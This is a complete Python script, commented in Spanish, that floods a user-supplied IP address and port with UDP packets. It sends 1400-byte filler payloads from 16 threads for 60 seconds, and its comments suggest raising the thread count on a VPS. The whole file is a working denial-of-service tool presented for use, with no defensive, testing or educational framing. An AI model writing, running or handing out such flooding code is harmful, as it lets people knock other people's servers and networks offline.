import socket
import threading
import time

def flood(ip, port, duration=60, threads=16):
    payload = b"X" * 1400  # 1400 bytes por paquete (cerca del MTU)
    end_time = time.time() + duration

    def sender():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end_time:
            try:
                sock.sendto(payload, (ip, port))
            except Exception:
                pass
        sock.close()

    ths = []
    for _ in range(threads):
        t = threading.Thread(target=sender)
        t.start()
        ths.append(t)
    for t in ths:
        t.join()

if __name__ == "__main__":
    ip_destino = input("IP destino: ").strip()
    puerto_destino = int(input("Puerto destino: ").strip())
    # Puedes editar la duración y hilos aquí si quieres
    duracion = 60  # segundos, puedes cambiarlo
    hilos = 16     # puedes subir a 32, 64, etc. según tu VPS
    print(f"Enviando paquetes a {ip_destino}:{puerto_destino} durante {duracion} segundos con {hilos} hilos...")
    flood(ip_destino, puerto_destino, duration=duracion, threads=hilos)
    print("Finalizado.")
